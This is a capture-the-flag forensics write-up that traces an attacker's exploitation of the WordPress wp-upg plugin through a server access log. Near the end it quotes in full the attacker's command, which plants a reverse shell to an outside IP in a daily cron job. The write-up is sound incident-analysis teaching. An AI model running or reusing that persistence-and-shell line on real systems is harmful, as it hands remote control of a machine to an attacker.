# Explanation
We are given the following file:
* `access.log`: Wordpress server logs.

In the log file, notice there are several requests related to a WordPress website. By slowly analyzing the logs, `82.179.92.206` has performed the most requests out of the IP addresses, indicating a suspicious activity.
<br><br>
Another way is to utilize a command to find the amount of times an IP addresses was involved by the number of requests (command is from HTB write-up).
```
cat access.log | cut -d " " -f 1 | sort | uniq -c
```

![logs2](https://github.com/warlocksmurf/hacktheboo-forensics/assets/121353711/c3d22e15-bab2-4f97-bcc6-276dcd772e18)

* `cut -d " " -f 1`: The cut command splits each line of the log file into fields using a space (" ") as the delimiter. It then extracts the first field (the IP address) from each line. This isolates the IP addresses from the log entries.
* `sort`: Sorts the extracted IP addresses in ascending order.
* `uniq -c`: Counts the number of unique occurrences of each unique IP address.

# Solution
By reading the instructions, they mentioned that the attacker may have exploited a vulnerability in a plugin. 
Hence, the search can be easier by filtering the logs using "wp-content/plugins/" which is the directory storing all the plugins. Requests from 82.179.92.206 with response status code of 200 are the key to identifying the vulnerability, as these can reveal whether the attacker's attempts were successful. 

By analyzing the logs, notice how some requests suggest that the attacker has exploited the `wp-upg` plugin since the plugin was responding with 200 OK messages. Additionally, `wp-upg` has certain vulnerabilities such as CVE-2022-4060 and CVE-2023-0039

![logs1](https://github.com/warlocksmurf/hacktheboo-forensics/assets/121353711/cbaf90b2-76ea-4cf9-a21c-16d31a38cfb7)

After identifying the vulnerable plugin, the logs are analyzed further and another important log was found. These requests indicate the attacker was attempting to execute arbitrary commands on the system.

![log3](https://github.com/warlocksmurf/hacktheboo-forensics/assets/121353711/a0a70010-2524-45e7-ae42-5673a5bce28e)

One of the requests creates a cron job named `testconnect` that connects to a Command and Control (CnC) server and prints the flag.

![logs4](https://github.com/warlocksmurf/hacktheboo-forensics/assets/121353711/0220b09f-37c3-4ec7-959a-09a0cc7099fb)

![logs6](https://github.com/warlocksmurf/hacktheboo-forensics/assets/121353711/d53e3a42-73cb-4d2c-8266-dfd7b7fc07c6)

At this point, I was stuck and required help from the HTB writeup. I found out that to retrieve the flag was to decode the URL using the `testconnect` cron job again. This can be done using the command:

```
echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect && Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev
```

![logs5](https://github.com/warlocksmurf/hacktheboo-forensics/assets/121353711/2f5ed61a-f7ef-4df4-86e9-c4081ec1fb51)
